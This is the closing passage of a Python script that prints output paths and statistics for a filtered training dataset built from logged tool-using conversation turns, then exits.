    print(f"Markdown view: {args.out_md}")
    print(f"JSONL view: {args.out_jsonl}")
    if not args.no_train:
        size_kb = args.out_train.stat().st_size / 1024
        print(f"\n{'='*55}")
        print(f"  TRAINING DATASET STATS")
        print(f"{'='*55}")
        print(f"  Total turns scanned:    {stats['total_turns']}")
        print(f"  Kept (clean):           {stats['kept']}")
        print(f"  Dropped (invalid JSON): {stats['dropped_invalid_json']}")
        print(f"  Dropped (bad tool):     {stats['dropped_bad_tool']}")
        print(f"  Dropped (no response):  {stats['dropped_no_response']}")
        print(f"  Action breakdown:       {json.dumps(stats['by_action'])}")
        print(f"  Output: {args.out_train}  ({size_kb:.1f} KB)")
        print(f"{'='*55}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
